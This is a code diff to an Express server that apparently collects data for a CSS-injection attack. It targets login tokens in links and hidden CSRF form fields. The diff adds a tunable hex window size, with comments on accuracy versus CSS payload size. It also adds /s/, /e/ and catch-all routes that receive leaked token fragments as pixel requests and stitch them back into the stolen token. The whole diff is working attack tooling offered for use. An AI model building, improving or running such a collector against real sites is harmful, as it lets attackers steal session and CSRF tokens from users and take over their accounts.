@@ -55,6 +55,7 @@ const PRESETS = {
     startSelector: 'token=',
     endSelector: '&operation=login',
     tokenLength: 40,
+    windowSize: 4,
   },
   hidden: {
     selector: 'input[type="hidden"][name="csrf"]',
@@ -63,6 +64,7 @@ const PRESETS = {
     startSelector: '',
     endSelector: '',
     tokenLength: 40,
+    windowSize: 4,
   },
 };
 
@@ -85,6 +87,9 @@ function buildConfig(userConfig) {
   const { tag, selectorPrefix } = parseSelector(userConfig.selector);
   const attribute = userConfig.attribute || 'href';
   const tokenLength = userConfig.tokenLength || 40;
+  // 4-char windows: ~99% single-guess accuracy at 40 chars but ~4.5 MB of CSS.
+  // 3-char windows: ~300 KB, but longer tokens often come back as candidates.
+  const windowSize = Number(userConfig.windowSize) === 3 ? 3 : 4;
   const sampleToken = crypto.randomBytes(Math.ceil(tokenLength / 2)).toString('hex').slice(0, tokenLength);
   const valuePrefix = selectorPrefix || userConfig.startSelector;
   const sampleExtra = userConfig.endSelector ? '&state=medium&rememberMe=false' : '';
@@ -104,12 +109,14 @@ function buildConfig(userConfig) {
   const startContext = userConfig.startSelector ? userConfig.startSelector.slice(-2) : '';
   const endContext = userConfig.endSelector ? userConfig.endSelector.slice(0, 2) : '';
 
+  // Hex windows in the known text around the token (e.g. "bac" in "callback")
+  // will leak too; the solver treats them as expected leftovers.
   const contextHexChunks = new Set();
-  const hexRe = /^[0-9a-f]{3}$/;
-  for (const str of [sampleValue.replace(sampleToken, ''), valuePrefix, userConfig.endSelector || '', sampleExtra]) {
-    for (let i = 0; i <= str.length - 3; i++) {
-      const c = str.substring(i, i + 3);
-      if (hexRe.test(c)) contextHexChunks.add(c);
+  const isWindow = new RegExp(`^[0-9a-f]{${windowSize}}$`);
+  for (const str of [valuePrefix, userConfig.endSelector || '', sampleExtra]) {
+    for (let i = 0; i + windowSize <= str.length; i++) {
+      const w = str.slice(i, i + windowSize);
+      if (isWindow.test(w)) contextHexChunks.add(w);
     }
   }
 
@@ -126,6 +133,7 @@ function buildConfig(userConfig) {
       sampleToken,
       sampleHtml,
       tokenLength,
+      windowSize,
     },
     contextHexChunks,
   };
@@ -167,48 +175,43 @@ app.post('/api/config', (req, res) => {
   console.log(`\n${G}${B}config updated${X}`);
   console.log(`${D}selector: ${currentConfig.selector}${X}`);
   console.log(`${D}attribute: ${currentConfig.attribute}${X}`);
-  console.log(`${D}length: ${currentConfig.tokenLength}${X}\n`);
+  console.log(`${D}length: ${currentConfig.tokenLength}${X}`);
+  console.log(`${D}window: ${currentConfig.windowSize}${X}\n`);
   res.json(currentConfig);
 });
 
-app.get('/log', (req, res) => {
-  const { t, c } = req.query;
+function record(t, c, res) {
   const now = Date.now();
-
-  switch (t) {
-    case 's': {
-      // A start marks a new extraction, but requests from the same burst may
-      // have overtaken it, so keep anything that arrived just before it.
-      const early = state.log.filter(r => r.at >= now - SETTLE_MS);
-      state = emptyState();
-      state.start = c;
-      for (const r of early) {
-        if (r.t === 'e') state.end = r.c;
-        else state.chunks.push(r.c);
-      }
-      state.log = early;
-      console.log(`\n${G}--- new extraction ---${X}`);
-      console.log(`${D}start:${X} ${c}`);
-      if (early.length) console.log(`${D}kept ${early.length} request(s) that arrived before the start${X}`);
-      break;
+  if (t === 's') {
+    // A start marks a new extraction, but requests from the same burst may
+    // have overtaken it, so keep anything that arrived just before it.
+    const early = state.log.filter(r => r.at >= now - SETTLE_MS);
+    state = emptyState();
+    state.start = c;
+    for (const r of early) {
+      if (r.t === 'e') state.end = r.c;
+      else state.chunks.push(r.c);
     }
-    case 'e':
-      state.end = c;
-      console.log(`${D}end:${X}   ${c}`);
-      break;
-    case 'm':
-      state.chunks.push(c);
-      console.log(`${D}chunk #${state.chunks.length}:${X} ${c}`);
-      break;
-    default:
-      return res.redirect('/api/token');
+    state.log = early;
+    console.log(`\n${G}--- new extraction ---${X}`);
+    console.log(`${D}start:${X} ${c}`);
+    if (early.length) console.log(`${D}kept ${early.length} request(s) that arrived before the start${X}`);
+  } else if (t === 'e') {
+    state.end = c;
+    console.log(`${D}end:${X}   ${c}`);
+  } else {
+    state.chunks.push(c);
+    console.log(`${D}chunk #${state.chunks.length}:${X} ${c}`);
   }
-
   state.log.push({ t, c, at: now });
   state.lastAt = now;
   state.dirty = true;
   res.type('gif').send(PIXEL);
-});
+}
+
+app.get('/s/:c([0-9a-f]+)', (req, res) => record('s', req.params.c, res));
+app.get('/e/:c([0-9a-f]+)', (req, res) => record('e', req.params.c, res));
+app.get('/:c([0-9a-f]+)', (req, res) => record('m', req.params.c, res));
 
 app.get('/api/token', (req, res) => {
   if (!state.start) {
@@ -220,7 +223,11 @@ app.get('/api/token', (req, res) => {
   if (!state.dirty && state.cached) {
     return res.json(state.cached);
   }
-  const result = tryStitch(state, 3, contextHexChunks, tokenLength);
+  const result = tryStitch(state, {
+    windowSize: currentConfig.windowSize,
+    tokenLength,
+    context: contextHexChunks,
+  });
   if (result) {
     if (result.candidates) {
       const more = result.truncated ? '+' : '';
